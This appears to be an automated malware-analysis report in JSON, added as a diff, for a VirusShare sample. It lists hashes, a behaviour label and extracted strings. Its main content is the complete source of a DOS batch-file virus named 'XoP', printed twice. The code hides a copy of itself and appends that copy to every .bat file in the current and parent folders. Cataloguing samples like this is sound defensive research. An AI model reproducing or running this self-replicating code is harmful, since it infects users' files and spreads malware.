@@ -1,0 +1,54 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "call": "May call a DLL using Excel 4 Macros"
+        },
+        "macro": "@echo off%[XoP]%\nif '%XoP%=='11 goto XoP2\nif '%2=='_ goto XoP1\nif exist \u0001:\\XoP.bat goto XoP\nif not exist %0.bat goto XoP2\nfind \"XoP\"<%0.bat>\u0001:\\XoP.bat\nattrib \u0001:\\XoP.bat +h\n:XoP\nfor %%v in (*.bat ..\\*.bat) do call \u0001:\\XoP %%v set XoP=lfgoto XoP2\n:XoP1\nfind /i \"XoP\"<%1>nul\nif not earorlovel 1 goto XoP2\ntype \u0001:\\XoP.bat>>%1\nset XoP=%XoP%1\n:XoP2"
+    },
+    "filename": "VirusShare_cd9955a51cb4e45dcbeb97cbc9aa55bf",
+    "filesize": 360,
+    "filetype": "data",
+    "hashes": {
+        "md5": "cd9955a51cb4e45dcbeb97cbc9aa55bf",
+        "sha1": "03ff53c2df5cee1f5ed9f4bb127e50b322027a63",
+        "sha256": "1dc581b0d135ab2cd97040ca2864ed6a6491e6dd682a0a427cfa34c4bb1380a0"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off%[XoP]%",
+            "if '%XoP%=='11 goto XoP2",
+            "if '%2=='_ goto XoP1",
+            "if exist ",
+            ":\\XoP.bat goto XoP",
+            "if not exist %0.bat goto XoP2",
+            "find \"XoP\"<%0.bat>",
+            ":\\XoP.bat",
+            "attrib ",
+            ":\\XoP.bat +h",
+            ":XoP",
+            "for %%v in (*.bat ..\\*.bat) do call ",
+            ":\\XoP %%v _",
+            "set XoP=lfgoto XoP2",
+            ":XoP1",
+            "find /i \"XoP\"<%1>nul",
+            "if not earorlovel 1 goto XoP2",
+            "type ",
+            ":\\XoP.bat>>%1",
+            "set XoP=%XoP%1",
+            ":XoP2"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.277489",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
